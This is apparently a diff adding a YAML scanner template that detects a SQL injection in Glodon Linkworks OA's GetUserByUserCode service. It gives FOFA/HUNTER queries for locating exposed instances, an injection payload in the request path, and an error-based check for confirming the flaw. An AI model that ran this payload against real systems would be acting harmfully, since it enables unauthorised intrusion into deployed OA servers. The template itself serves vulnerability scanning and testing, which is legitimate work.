@@ -1,0 +1,26 @@
+id: glodon-linkworks-Getuserbyusercode-sqli
+
+info:
+  name: 广联达oa Linkworks Getuserbyusercode 存在SQL注入
+  author: hufei,Y3y1ng
+  severity: high
+  verified: true
+  description: |
+    广联达 Linkworks办公OA Getuserbyusercode 存在sql注入
+    FOFA: body="/Services/Identification/"
+    HUNTER: web.body="/Services/Identification/"
+  reference:
+    - https://github.com/iamHuFei/HVVault/blob/main/docs/%E5%B9%BF%E8%81%94%E8%BE%BE/glodon-linkworks-getuserbyusercode-sqli.yaml
+  tags: glodon,linkworks,sqli,oa
+  created: 2023/09/18
+
+rules:
+  r0: #验证SQL注入
+    request:
+      method: GET
+      path: /Org/service/Service.asmx/GetUserByUserCode?userCode=1%27-1/user--%27&EncryptData=1
+    expression: >
+      response.status == 500 && 
+      response.body.bcontains(b"nvarchar") &&
+      response.body.bcontains(b"39")
+expression: r0()
